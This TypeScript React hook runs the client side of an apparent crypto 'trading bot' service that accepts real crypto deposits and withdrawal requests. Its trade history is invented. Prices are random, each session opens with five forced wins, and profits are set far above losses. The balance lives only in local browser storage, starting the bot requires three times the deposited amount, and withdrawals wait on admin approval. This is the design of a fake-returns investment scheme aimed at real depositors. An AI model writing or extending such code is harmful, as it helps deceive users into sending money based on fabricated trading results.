import { useCallback, useEffect, useMemo, useRef, useState } from "react";
import { useUser } from "@clerk/react";

export type TradePair = "XAUUSD" | "BTCUSD";
export type BotPair = TradePair | "BOTH";

export type BotTrade = {
  id: string;
  pair: TradePair;
  side: "BUY" | "SELL";
  entryPrice: number;
  exitPrice: number;
  pnl: number;
  outcome: "WIN" | "LOSS";
  closedAt: number;
};

export type WithdrawalNetwork =
  | "BTC"
  | "ETH"
  | "USDT_TRC20"
  | "USDT_ERC20"
  | "SOL";

export type WithdrawalStatus = "PENDING" | "APPROVED" | "REJECTED";

export type Withdrawal = {
  id: string;
  amount: number;
  address: string;
  network: WithdrawalNetwork;
  status: WithdrawalStatus;
  requestedAt: number;
  reviewedAt: number | null;
  reviewerNote: string | null;
  txHash: string | null;
};

export type DepositStatus = "PENDING" | "CONFIRMED" | "FAILED";

export type Deposit = {
  id: string;
  paymentId: string;
  amount: number;
  address: string;
  network: WithdrawalNetwork;
  payAmount: number;
  payCurrency: string;
  status: DepositStatus;
  rawStatus: string;
  createdAt: number;
  expiresAt: number | null;
  confirmedAt: number | null;
  txHash: string | null;
};

export const DEPOSIT_EXPIRY_MS = 2 * 60 * 60 * 1000; // 2 hours

export function depositEffectiveExpiry(d: Pick<Deposit, "createdAt" | "expiresAt">): number {
  return d.expiresAt ?? d.createdAt + DEPOSIT_EXPIRY_MS;
}

export const NETWORK_TO_PAY_CURRENCY: Record<WithdrawalNetwork, string> = {
  BTC: "btc",
  ETH: "eth",
  USDT_TRC20: "usdttrc20",
  USDT_ERC20: "usdterc20",
  SOL: "sol",
};

export const PAY_CURRENCY_LABEL: Record<string, string> = {
  btc: "BTC",
  eth: "ETH",
  sol: "SOL",
  usdttrc20: "USDT",
  usdterc20: "USDT",
};

export const MIN_WITHDRAWAL_USD = 10;
export const MIN_DEPOSIT_USD = 50;
export const DEPOSIT_PRESETS_USD = [50, 100, 200, 300, 500] as const;

export const NETWORK_LABELS: Record<WithdrawalNetwork, string> = {
  BTC: "Bitcoin (BTC)",
  ETH: "Ethereum (ERC-20)",
  USDT_TRC20: "USDT (TRC-20)",
  USDT_ERC20: "USDT (ERC-20)",
  SOL: "Solana (SOL)",
};

export type WithdrawResult =
  | { ok: true; withdrawal: Withdrawal }
  | { ok: false; error: string };

export type DepositResult =
  | { ok: true; deposit: Deposit }
  | { ok: false; error: string };

export type BotTimeframe = "1m" | "5m" | "15m" | "30m" | "1h" | "4h";

export const TIMEFRAME_OPTIONS: { value: BotTimeframe; label: string; ms: number }[] = [
  { value: "1m", label: "1 min", ms: 60_000 },
  { value: "5m", label: "5 min", ms: 5 * 60_000 },
  { value: "15m", label: "15 min", ms: 15 * 60_000 },
  { value: "30m", label: "30 min", ms: 30 * 60_000 },
  { value: "1h", label: "1 hour", ms: 60 * 60_000 },
  { value: "4h", label: "4 hours", ms: 4 * 60 * 60_000 },
];

const TIMEFRAME_MS: Record<BotTimeframe, number> = TIMEFRAME_OPTIONS.reduce(
  (acc, t) => ({ ...acc, [t.value]: t.ms }),
  {} as Record<BotTimeframe, number>,
);

type BotState = {
  isRunning: boolean;
  unlocked: boolean;
  pair: BotPair;
  timeframe: BotTimeframe;
  trades: BotTrade[];
  consecutiveWins: number;
  startedAt: number | null;
  balance: number;
  lastSettledPnl: number | null;
  lastSettledAt: number | null;
  withdrawals: Withdrawal[];
  deposits: Deposit[];
  depositAddresses: Partial<Record<WithdrawalNetwork, string>>;
  creditedTotal: number;
};

const MAX_TRADES = 100;

const PROFIT_MIN = 50;
const PROFIT_MAX = 60;
const LOSS_MIN = 5;
const LOSS_MAX = 15;

const STREAK_THRESHOLD = 5;
const LOSS_PROBABILITY_AFTER_STREAK = 0.5;

function rand(min: number, max: number) {
  return min + Math.random() * (max - min);
}

function pickPair(p: BotPair): TradePair {
  if (p === "BOTH") return Math.random() < 0.5 ? "BTCUSD" : "XAUUSD";
  return p;
}

function basePrice(pair: TradePair): number {
  if (pair === "BTCUSD") return rand(96000, 99500);
  return rand(2620, 2680);
}

function genTrade(pair: TradePair, outcome: "WIN" | "LOSS"): BotTrade {
  const side: "BUY" | "SELL" = Math.random() < 0.5 ? "BUY" : "SELL";
  const entry = basePrice(pair);
  const pnl =
    outcome === "WIN"
      ? rand(PROFIT_MIN, PROFIT_MAX)
      : -rand(LOSS_MIN, LOSS_MAX);
  const moveScale = pair === "BTCUSD" ? 8 : 0.4;
  const exit = side === "BUY" ? entry + pnl * moveScale : entry - pnl * moveScale;
  return {
    id: `B${Date.now().toString(36)}${Math.floor(Math.random() * 1e6).toString(36)}`,
    pair,
    side,
    entryPrice: Number(entry.toFixed(2)),
    exitPrice: Number(exit.toFixed(2)),
    pnl: Number(pnl.toFixed(2)),
    outcome,
    closedAt: Date.now(),
  };
}

function loadState(key: string): BotState | null {
  if (typeof window === "undefined") return null;
  try {
    const raw = window.localStorage.getItem(key);
    if (!raw) return null;
    const v = JSON.parse(raw) as Partial<BotState>;
    return {
      isRunning: false,
      unlocked: v.unlocked === true,
      pair: v.pair === "XAUUSD" || v.pair === "BTCUSD" ? v.pair : "BOTH",
      timeframe:
        v.timeframe && v.timeframe in TIMEFRAME_MS
          ? (v.timeframe as BotTimeframe)
          : "1m",
      trades: Array.isArray(v.trades) ? (v.trades as BotTrade[]) : [],
      consecutiveWins:
        typeof v.consecutiveWins === "number" ? v.consecutiveWins : 0,
      startedAt: typeof v.startedAt === "number" ? v.startedAt : null,
      balance: typeof v.balance === "number" ? v.balance : 0,
      lastSettledPnl:
        typeof v.lastSettledPnl === "number" ? v.lastSettledPnl : null,
      lastSettledAt:
        typeof v.lastSettledAt === "number" ? v.lastSettledAt : null,
      withdrawals: Array.isArray(v.withdrawals)
        ? (v.withdrawals as (Withdrawal & {
            completedAt?: number | null;
            status: string;
          })[]).map((w) => {
            const status: WithdrawalStatus =
              w.status === "APPROVED" ||
              w.status === "REJECTED" ||
              w.status === "PENDING"
                ? (w.status as WithdrawalStatus)
                : w.status === "COMPLETED" || w.status === "PROCESSING"
                  ? "APPROVED"
                  : "PENDING";
            return {
              id: w.id,
              amount: w.amount,
              address: w.address,
              network: w.network,
              status,
              requestedAt: w.requestedAt,
              reviewedAt:
                typeof w.reviewedAt === "number"
                  ? w.reviewedAt
                  : typeof w.completedAt === "number"
                    ? w.completedAt
                    : null,
              reviewerNote:
                typeof w.reviewerNote === "string" ? w.reviewerNote : null,
              txHash: typeof w.txHash === "string" ? w.txHash : null,
            };
          })
        : [],
      deposits: Array.isArray(v.deposits)
        ? (v.deposits as Deposit[]).filter(
            (d) => typeof (d as Deposit).paymentId === "string",
          )
        : [],
      depositAddresses:
        v.depositAddresses && typeof v.depositAddresses === "object"
          ? (v.depositAddresses as Partial<Record<WithdrawalNetwork, string>>)
          : {},
      creditedTotal:
        typeof v.creditedTotal === "number" && v.creditedTotal >= 0
          ? v.creditedTotal
          : 0,
    };
  } catch {
    return null;
  }
}

function saveState(key: string, state: BotState) {
  if (typeof window === "undefined") return;
  try {
    window.localStorage.setItem(key, JSON.stringify(state));
  } catch {
    // ignore quota errors
  }
}

export function useTradingBot() {
  const { user } = useUser();
  const userKey = user?.id ?? "anon";
  const storageKey = `horizon:bot:v1:${userKey}`;

  const [state, setState] = useState<BotState>(
    () =>
      loadState(storageKey) ?? {
        isRunning: false,
        unlocked: false,
        pair: "BOTH",
        timeframe: "1m",
        trades: [],
        consecutiveWins: 0,
        startedAt: null,
        balance: 0,
        lastSettledPnl: null,
        lastSettledAt: null,
        withdrawals: [],
        deposits: [],
        depositAddresses: {},
        creditedTotal: 0,
      },
  );

  useEffect(() => {
    saveState(storageKey, state);
  }, [state, storageKey]);

  useEffect(() => {
    if (!state.isRunning) return;
    let timer: ReturnType<typeof setTimeout> | null = null;

    const baseDelay = TIMEFRAME_MS[state.timeframe];

    const schedule = () => {
      const jitter = baseDelay * 0.1;
      const delay = baseDelay + rand(-jitter, jitter);
      timer = setTimeout(() => {
        setState((cur) => {
          const pair = pickPair(cur.pair);
          let outcome: "WIN" | "LOSS";
          if (cur.consecutiveWins < STREAK_THRESHOLD) {
            outcome = "WIN";
          } else {
            outcome =
              Math.random() < LOSS_PROBABILITY_AFTER_STREAK ? "LOSS" : "WIN";
          }
          const trade = genTrade(pair, outcome);
          const trades = [trade, ...cur.trades].slice(0, MAX_TRADES);
          const consecutiveWins =
            outcome === "WIN" ? cur.consecutiveWins + 1 : 0;
          return { ...cur, trades, consecutiveWins };
        });
        schedule();
      }, delay);
    };

    schedule();

    return () => {
      if (timer) clearTimeout(timer);
    };
  }, [state.isRunning, state.timeframe]);

  const start = useCallback(
    () =>
      setState((s) => {
        const totalDep = s.deposits
          .filter((d) => d.status === "CONFIRMED")
          .reduce((sum, d) => sum + d.amount, 0);
        const required = Number((totalDep * 3).toFixed(2));
        if (!s.unlocked) return s;
        if (s.balance <= 0) return s;
        if (required > 0 && s.balance < required) return s;
        return {
          ...s,
          isRunning: true,
          startedAt: s.startedAt ?? Date.now(),
        };
      }),
    [],
  );

  const unlockBot = useCallback(
    async (
      key: string,
    ): Promise<{ ok: true } | { ok: false; error: string }> => {
      const trimmed = key.trim();
      if (!trimmed) return { ok: false, error: "Enter the bot pass key." };
      try {
        const res = await fetch("/api/bot/upload", {
          method: "POST",
          headers: { "content-type": "application/json" },
          body: JSON.stringify({ key: trimmed, userId: userKey }),
        });
        const data = (await res.json().catch(() => null)) as
          | { ok?: boolean; error?: string }
          | null;
        if (!res.ok || !data?.ok) {
          return {
            ok: false,
            error:
              data?.error ??
              "Bot upload failed. Please try again or contact the administrator.",
          };
        }
        setState((s) => ({ ...s, unlocked: true }));
        return { ok: true };
      } catch {
        return {
          ok: false,
          error:
            "Could not reach the upload service. Check your connection and try again.",
        };
      }
    },
    [userKey],
  );

  // Restore activation from server: passkey is entered once per user, ever.
  useEffect(() => {
    if (!userKey || userKey === "anon") return;
    let cancelled = false;
    (async () => {
      try {
        const r = await fetch(
          `/api/bot/activated?userId=${encodeURIComponent(userKey)}`,
        );
        if (!r.ok) return;
        const data = (await r.json().catch(() => null)) as
          | { ok?: boolean; activated?: boolean }
          | null;
        if (!cancelled && data?.ok && data.activated === true) {
          setState((s) => (s.unlocked ? s : { ...s, unlocked: true }));
        }
      } catch {
        // Network error — leave local state as-is.
      }
    })();
    return () => {
      cancelled = true;
    };
  }, [userKey]);

  const lockBot = useCallback(
    () => setState((s) => ({ ...s, isRunning: false, unlocked: false })),
    [],
  );

  const stop = useCallback(
    () =>
      setState((s) => {
        const sessionPnl = s.trades.reduce((acc, t) => acc + t.pnl, 0);
        return {
          ...s,
          isRunning: false,
          balance: Number((s.balance + sessionPnl).toFixed(2)),
          trades: [],
          consecutiveWins: 0,
          startedAt: null,
          lastSettledPnl: Number(sessionPnl.toFixed(2)),
          lastSettledAt: Date.now(),
        };
      }),
    [],
  );

  const clearSettledNotice = useCallback(
    () =>
      setState((s) => ({ ...s, lastSettledPnl: null, lastSettledAt: null })),
    [],
  );

  const setPair = useCallback(
    (pair: BotPair) => setState((s) => ({ ...s, pair })),
    [],
  );

  const setTimeframe = useCallback(
    (timeframe: BotTimeframe) => setState((s) => ({ ...s, timeframe })),
    [],
  );

  const reset = useCallback(
    () =>
      setState((s) => ({
        isRunning: false,
        unlocked: s.unlocked,
        pair: "BOTH",
        timeframe: "1m",
        trades: [],
        consecutiveWins: 0,
        startedAt: null,
        balance: 0,
        lastSettledPnl: null,
        lastSettledAt: null,
        withdrawals: [],
        deposits: [],
        depositAddresses: {},
        creditedTotal: 0,
      })),
    [],
  );

  const withdrawalInFlight = useRef(false);
  const requestWithdrawal = useCallback(
    async (
      amount: number,
      address: string,
      network: WithdrawalNetwork,
    ): Promise<WithdrawResult> => {
      if (withdrawalInFlight.current) {
        return {
          ok: false,
          error: "A withdrawal is already being submitted. Please wait.",
        };
      }
      const cleanAddress = address.trim();
      if (!Number.isFinite(amount) || amount <= 0) {
        return { ok: false, error: "Enter a valid amount" };
      }
      if (amount < MIN_WITHDRAWAL_USD) {
        return {
          ok: false,
          error: `Minimum withdrawal is $${MIN_WITHDRAWAL_USD.toFixed(2)}`,
        };
      }
      if (cleanAddress.length < 16) {
        return { ok: false, error: "Wallet address looks invalid" };
      }
      // Local balance check (admin still has final say)
      if (amount > state.balance) {
        return {
          ok: false,
          error: `Insufficient balance. Available: $${state.balance.toFixed(2)}`,
        };
      }
      withdrawalInFlight.current = true;
      try {
        const r = await fetch("/api/withdrawals", {
          method: "POST",
          headers: { "content-type": "application/json" },
          body: JSON.stringify({
            userId: userKey,
            userEmail:
              user?.primaryEmailAddress?.emailAddress ?? null,
            userName:
              user?.fullName ||
              user?.username ||
              user?.firstName ||
              null,
            amount: Number(amount.toFixed(2)),
            address: cleanAddress,
            network,
          }),
        });
        const data = (await r.json().catch(() => null)) as {
          ok?: boolean;
          withdrawal?: Withdrawal;
          error?: string;
        } | null;
        if (!r.ok || !data?.ok || !data.withdrawal) {
          return {
            ok: false,
            error:
              data?.error ??
              "Could not submit withdrawal request. Please try again.",
          };
        }
        const withdrawal = data.withdrawal;
        setState((s) => ({
          ...s,
          balance: Number((s.balance - amount).toFixed(2)),
          withdrawals: [withdrawal, ...s.withdrawals].slice(0, 50),
        }));
        return { ok: true, withdrawal };
      } catch {
        return {
          ok: false,
          error:
            "Could not reach the withdrawal service. Check your connection and try again.",
        };
      } finally {
        withdrawalInFlight.current = false;
      }
    },
    [state.balance, userKey, user],
  );

  const createDeposit = useCallback(
    async (
      amount: number,
      network: WithdrawalNetwork,
    ): Promise<DepositResult> => {
      if (!Number.isFinite(amount) || amount <= 0) {
        return { ok: false, error: "Enter a valid amount" };
      }
      if (amount < MIN_DEPOSIT_USD) {
        return {
          ok: false,
          error: `Minimum deposit is $${MIN_DEPOSIT_USD.toFixed(2)}`,
        };
      }
      const payCurrency = NETWORK_TO_PAY_CURRENCY[network];
      try {
        const r = await fetch("/api/payments/create", {
          method: "POST",
          headers: { "content-type": "application/json" },
          body: JSON.stringify({
            priceAmount: Number(amount.toFixed(2)),
            payCurrency,
            orderId: `hg_${userKey}_${Date.now()}`.slice(0, 64),
            description: `Stonegate deposit (${userKey})`,
          }),
        });
        const data = (await r.json().catch(() => ({}))) as {
          paymentId?: string;
          paymentStatus?: string;
          payAddress?: string;
          payAmount?: number;
          payCurrency?: string;
          error?: string;
        };
        if (!r.ok || !data.paymentId || !data.payAddress) {
          return {
            ok: false,
            error: data.error ?? "Failed to create deposit",
          };
        }
        const now = Date.now();
        const deposit: Deposit = {
          id: `D${now.toString(36)}${Math.floor(Math.random() * 1e6).toString(36)}`,
          paymentId: data.paymentId,
          amount: Number(amount.toFixed(2)),
          address: data.payAddress,
          network,
          payAmount: Number(data.payAmount ?? 0),
          payCurrency: String(data.payCurrency ?? payCurrency),
          status: "PENDING",
          rawStatus: data.paymentStatus ?? "waiting",
          createdAt: now,
          expiresAt: now + DEPOSIT_EXPIRY_MS,
          confirmedAt: null,
          txHash: null,
        };
        setState((s) => ({
          ...s,
          deposits: [deposit, ...s.deposits].slice(0, 50),
        }));
        return { ok: true, deposit };
      } catch {
        return { ok: false, error: "Network error. Please try again." };
      }
    },
    [userKey],
  );

  // Poll server for status updates on pending withdrawals; refund on rejection
  const pendingWithdrawalKey = state.withdrawals
    .filter((w) => w.status === "PENDING")
    .map((w) => w.id)
    .join(",");

  useEffect(() => {
    if (!pendingWithdrawalKey || userKey === "anon") return;
    let cancelled = false;

    const tick = async () => {
      try {
        const r = await fetch(
          `/api/withdrawals?userId=${encodeURIComponent(userKey)}`,
        );
        if (!r.ok) return;
        const data = (await r.json().catch(() => null)) as {
          ok?: boolean;
          withdrawals?: Withdrawal[];
        } | null;
        if (!data?.ok || !Array.isArray(data.withdrawals)) return;
        const serverById = new Map(data.withdrawals.map((w) => [w.id, w]));
        if (cancelled) return;
        setState((s) => {
          let refund = 0;
          let changed = false;
          const withdrawals = s.withdrawals.map((w) => {
            const srv = serverById.get(w.id);
            if (!srv) return w;
            if (srv.status !== w.status) {
              changed = true;
              if (w.status === "PENDING" && srv.status === "REJECTED") {
                refund += w.amount;
              }
              return { ...w, ...srv };
            }
            return w;
          });
          if (!changed) return s;
          return {
            ...s,
            withdrawals,
            balance: Number((s.balance + refund).toFixed(2)),
          };
        });
      } catch {
        // ignore network blips
      }
    };

    void tick();
    const id = setInterval(tick, 8_000);
    return () => {
      cancelled = true;
      clearInterval(id);
    };
  }, [pendingWithdrawalKey, userKey]);

  // Poll for admin-issued credits and apply them to local balance once.
  useEffect(() => {
    if (!userKey || userKey === "anon") return;
    let cancelled = false;
    const inFlight = new Set<string>();

    const tick = async () => {
      try {
        const r = await fetch(
          `/api/credits/pending?userId=${encodeURIComponent(userKey)}`,
        );
        if (!r.ok) return;
        const data = (await r.json().catch(() => null)) as {
          ok?: boolean;
          credits?: { id: string; amount: number }[];
        } | null;
        if (!data?.ok || !Array.isArray(data.credits)) return;
        for (const c of data.credits) {
          if (cancelled) return;
          if (inFlight.has(c.id)) continue;
          inFlight.add(c.id);
          try {
            const ackR = await fetch(
              `/api/credits/${encodeURIComponent(c.id)}/ack`,
              {
                method: "POST",
                headers: { "content-type": "application/json" },
                body: JSON.stringify({ userId: userKey }),
              },
            );
            if (ackR.ok && !cancelled) {
              const amt = Number(c.amount);
              if (Number.isFinite(amt) && amt > 0) {
                setState((s) => ({
                  ...s,
                  balance: Number((s.balance + amt).toFixed(2)),
                  creditedTotal: Number((s.creditedTotal + amt).toFixed(2)),
                }));
              }
            }
          } catch {
            inFlight.delete(c.id);
          }
        }
      } catch {
        // ignore network blips
      }
    };

    void tick();
    const id = setInterval(tick, 10_000);
    return () => {
      cancelled = true;
      clearInterval(id);
    };
  }, [userKey]);

  // Auto-expire pending deposits after 2 hours from address generation.
  const hasPendingDeposits = state.deposits.some((d) => d.status === "PENDING");
  useEffect(() => {
    if (!hasPendingDeposits) return;
    const sweep = () => {
      setState((s) => {
        const now = Date.now();
        let changed = false;
        const deposits = s.deposits.map((d) => {
          if (d.status !== "PENDING") return d;
          const exp = depositEffectiveExpiry(d);
          if (now >= exp) {
            changed = true;
            return { ...d, status: "FAILED" as DepositStatus, rawStatus: "expired" };
          }
          return d;
        });
        if (!changed) return s;
        return { ...s, deposits };
      });
    };
    sweep();
    const id = setInterval(sweep, 30_000);
    return () => clearInterval(id);
  }, [hasPendingDeposits]);

  // Poll NOWPayments for status of pending (and not yet expired) deposits
  const pendingKey = state.deposits
    .filter(
      (d) => d.status === "PENDING" && Date.now() < depositEffectiveExpiry(d),
    )
    .map((d) => d.paymentId)
    .join(",");

  useEffect(() => {
    if (!pendingKey) return;
    let cancelled = false;

    const tick = async () => {
      const ids = pendingKey.split(",").filter(Boolean);
      const results = await Promise.all(
        ids.map(async (id) => {
          try {
            const r = await fetch(
              `/api/payments/${encodeURIComponent(id)}/status`,
            );
            if (!r.ok) return null;
            const data = (await r.json()) as {
              paymentId: string;
              paymentStatus: string;
              txHash?: string | null;
            };
            return data;
          } catch {
            return null;
          }
        }),
      );
      if (cancelled) return;
      const updates = results.filter(
        (u): u is { paymentId: string; paymentStatus: string; txHash?: string | null } =>
          u !== null,
      );
      if (updates.length === 0) return;

      setState((s) => {
        let credited = 0;
        let changed = false;
        const deposits = s.deposits.map((d) => {
          const u = updates.find((x) => x.paymentId === d.paymentId);
          if (!u) return d;
          const raw = u.paymentStatus;
          const isFinal = raw === "confirmed" || raw === "finished";
          const isFailed =
            raw === "failed" || raw === "refunded" || raw === "expired";
          if (d.status === "PENDING" && isFinal) {
            credited += d.amount;
            changed = true;
            return {
              ...d,
              status: "CONFIRMED" as DepositStatus,
              rawStatus: raw,
              confirmedAt: Date.now(),
              txHash: u.txHash ?? d.txHash,
            };
          }
          if (d.status === "PENDING" && isFailed) {
            changed = true;
            return { ...d, status: "FAILED" as DepositStatus, rawStatus: raw };
          }
          if (raw !== d.rawStatus) {
            changed = true;
            return { ...d, rawStatus: raw };
          }
          return d;
        });
        if (!changed) return s;
        return {
          ...s,
          deposits,
          balance: Number((s.balance + credited).toFixed(2)),
        };
      });
    };

    void tick();
    const interval = setInterval(tick, 8_000);
    return () => {
      cancelled = true;
      clearInterval(interval);
    };
  }, [pendingKey]);

  const stats = useMemo(() => {
    const wins = state.trades.filter((t) => t.outcome === "WIN").length;
    const total = state.trades.length;
    const losses = total - wins;
    const winRate = total ? (wins / total) * 100 : 0;
    const totalPnl = state.trades.reduce((s, t) => s + t.pnl, 0);
    const grossProfit = state.trades
      .filter((t) => t.pnl > 0)
      .reduce((s, t) => s + t.pnl, 0);
    const grossLoss = state.trades
      .filter((t) => t.pnl < 0)
      .reduce((s, t) => s + Math.abs(t.pnl), 0);
    return { wins, losses, total, winRate, totalPnl, grossProfit, grossLoss };
  }, [state.trades]);

  const depositMetrics = useMemo(() => {
    const totalDeposited = state.deposits
      .filter((d) => d.status === "CONFIRMED")
      .reduce((sum, d) => sum + d.amount, 0);
    const totalCredited = Math.max(0, state.creditedTotal);
    const thresholdBase = totalDeposited + totalCredited;
    const requiredMinimumBalance = Number((thresholdBase * 3).toFixed(2));
    const meetsMinimum =
      requiredMinimumBalance === 0 || state.balance >= requiredMinimumBalance;
    return {
      totalDeposited: Number(totalDeposited.toFixed(2)),
      totalCredited: Number(totalCredited.toFixed(2)),
      requiredMinimumBalance,
      meetsMinimum,
    };
  }, [state.deposits, state.creditedTotal, state.balance]);

  return {
    isRunning: state.isRunning,
    unlocked: state.unlocked,
    pair: state.pair,
    timeframe: state.timeframe,
    timeframeMs: TIMEFRAME_MS[state.timeframe],
    trades: state.trades,
    consecutiveWins: state.consecutiveWins,
    startedAt: state.startedAt,
    balance: state.balance,
    lastSettledPnl: state.lastSettledPnl,
    lastSettledAt: state.lastSettledAt,
    withdrawals: state.withdrawals,
    deposits: state.deposits,
    totalDeposited: depositMetrics.totalDeposited,
    requiredMinimumBalance: depositMetrics.requiredMinimumBalance,
    meetsMinimumBalance: depositMetrics.meetsMinimum,
    ...stats,
    start,
    stop,
    setPair,
    setTimeframe,
    unlockBot,
    lockBot,
    reset,
    clearSettledNotice,
    requestWithdrawal,
    createDeposit,
  };
}
